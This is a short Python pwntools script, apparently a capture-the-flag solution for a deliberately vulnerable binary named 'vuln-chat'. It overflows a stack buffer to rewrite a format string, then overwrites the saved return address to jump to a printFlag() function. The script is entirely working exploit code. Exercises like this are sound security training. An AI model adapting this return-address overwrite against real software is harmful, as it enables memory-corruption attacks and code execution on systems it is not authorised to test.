#!/usr/bin/python3
from pwn import *

r = process('./vuln-chat')

# first, change the format string to %90s
offset1 = 0x19 - 0x5      # local_1d to local_9
target1 = 0x73303925      # %90s
pay1 = b"A"*offset1 + target1.to_bytes(4, 'little')

# Then, overwrite return pointer
offset2 = 0x2d + 4        # local_31 to sfp, +4 to rp
target2 = p32(0x0804856b) # addr of printFlag()
pay2 = b"A"*offset2 + target2

# overwrite the format string on the stack
r.recvuntil(b'name: ')
r.sendline(pay1)

# overwrite the return pointer
r.recv(1000)
r.sendline(pay2)

# print the flag
print(r.recv(1000).decode()) # recv message
print(r.recv(1000).decode()) # recv flag
